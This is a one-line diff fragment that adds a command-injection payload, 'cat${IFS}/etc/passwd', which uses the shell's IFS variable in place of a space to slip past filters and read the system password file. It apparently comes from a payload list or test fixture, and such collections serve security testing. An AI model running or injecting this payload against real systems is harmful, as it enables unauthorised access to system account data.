@@ -1,0 +1,1 @@
+cat${IFS}/etc/passwd
